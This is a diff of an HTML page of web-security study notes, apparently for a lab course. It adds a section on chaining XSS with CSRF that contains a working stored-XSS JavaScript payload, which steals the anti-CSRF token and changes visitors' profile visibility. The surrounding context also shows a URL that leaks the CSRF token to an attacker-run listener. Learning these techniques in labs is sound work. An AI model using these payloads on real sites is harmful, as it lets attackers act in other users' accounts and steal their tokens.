@@ -956,6 +956,15 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#xss-csrf-chaining" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS &amp; CSRF Chaining
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -1494,6 +1503,15 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#xss-csrf-chaining" class="md-nav__link">
+    <span class="md-ellipsis">
+      XSS &amp; CSRF Chaining
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -1743,6 +1761,39 @@ dependning on what (if anything) is returned will tell you which field is vulner
 </span></code></pre></div></td></tr></table></div></li>
 <li>visit <code>http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f&lt;VPN/TUN Adapter IP&gt;:8000%2f</code> where <code>%3Ctable background='%2f%2f&lt;VPN/TUN Adapter IP&gt;:8000%2f</code> is the reflected part</li>
 <li>listener should record the csrf token which can be used for post requests</li>
+</ul>
+<h3 id="xss-csrf-chaining">XSS &amp; CSRF Chaining</h3>
+<ul>
+<li>In this example we change the profiles visibility</li>
+<li>Use the below script to recreate changing the profiles visibility
+<div class="language-javascript highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">JavaScript</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+</span><span id="__span-15-2"><span class="kd">var</span><span class="w"> </span><span class="nx">req</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span><span id="__span-15-3"><span class="nx">req</span><span class="p">.</span><span class="nx">onload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">handleResponse</span><span class="p">;</span><span class="w"> </span><span class="c1">// triggers the handle response function on page load</span>
+</span><span id="__span-15-4"><span class="nx">req</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">,</span><span class="s1">&#39;/app/change-visibility&#39;</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span><span class="w"> </span><span class="c1">// get request for the change visibility page</span>
+</span><span id="__span-15-5"><span class="nx">req</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span><span id="__span-15-6"><span class="kd">function</span><span class="w"> </span><span class="nx">handleResponse</span><span class="p">(</span><span class="nx">d</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-15-7"><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">responseText</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/name=&quot;csrf&quot; type=&quot;hidden&quot; value=&quot;(\w+)&quot;/</span><span class="p">)[</span><span class="mf">1</span><span class="p">];</span><span class="w"> </span><span class="c1">// locates the csrf token</span>
+</span><span id="__span-15-8"><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">changeReq</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">XMLHttpRequest</span><span class="p">();</span><span class="w"> </span>
+</span><span id="__span-15-9"><span class="w">    </span><span class="nx">changeReq</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;post&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;/app/change-visibility&#39;</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span><span class="w"> </span><span class="c1">// creates post request</span>
+</span><span id="__span-15-10"><span class="w">    </span><span class="nx">changeReq</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">);</span><span class="w"> </span><span class="c1">// sets the header</span>
+</span><span id="__span-15-11"><span class="w">    </span><span class="nx">changeReq</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;csrf=&#39;</span><span class="o">+</span><span class="nx">token</span><span class="o">+</span><span class="s1">&#39;&amp;action=change&#39;</span><span class="p">);</span><span class="w"> </span><span class="c1">// uses the previously aquired anti-csrf token and changes profile visibility</span>
+</span><span id="__span-15-12"><span class="p">};</span>
+</span><span id="__span-15-13"><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>Enter the script into a field vulnerable to XSS and update the profile</li>
+<li>Now when a different user visits that persons public profile the script will be executed and their profile visibility will change</li>
 </ul>
 
 
